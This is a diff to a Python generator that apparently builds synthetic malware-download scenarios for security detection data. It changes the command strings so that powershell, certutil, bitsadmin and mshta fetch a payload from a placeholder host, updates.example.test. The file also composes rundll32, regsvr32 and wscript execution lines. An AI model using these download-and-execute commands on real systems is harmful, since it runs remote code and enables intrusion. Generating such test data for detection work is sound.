@@ -251,10 +251,10 @@ def _malware(rng: random.Random, difficulty: str, noise_level: str, environment:
     seed = _scenario_seed(rng); scenario_id = "malware_download_execution"; target = _target(rng, environment, scenario_id); start = _base_start(rng); config = _difficulty_config(difficulty)
     downloader = rng.choice(["powershell.exe", "certutil.exe", "bitsadmin.exe", "mshta.exe"])
     command_by_process = {
-        "powershell.exe": "powershell.exe Invoke-WebRequest https://example.test/payload.exe -OutFile payload.exe",
-        "certutil.exe": "certutil.exe -urlcache -split -f https://example.test/payload.exe payload.exe",
-        "bitsadmin.exe": "bitsadmin.exe /transfer job https://example.test/payload.exe payload.exe",
-        "mshta.exe": "mshta.exe https://example.test/loader.hta",
+        "powershell.exe": "powershell.exe Invoke-WebRequest https://updates.example.test/agent.bin -OutFile payload.exe",
+        "certutil.exe": "certutil.exe -urlcache -split -f https://updates.example.test/agent.bin payload.exe",
+        "bitsadmin.exe": "bitsadmin.exe /transfer job https://updates.example.test/agent.bin payload.exe",
+        "mshta.exe": "mshta.exe https://updates.example.test/loader.hta",
     }
     executor = rng.choice(["rundll32.exe", "regsvr32.exe", "wscript.exe", "payload.exe"])
     execution_command = f"{executor} payload.dll,Start" if executor in {"rundll32.exe", "regsvr32.exe"} else f"{executor} payload.exe"
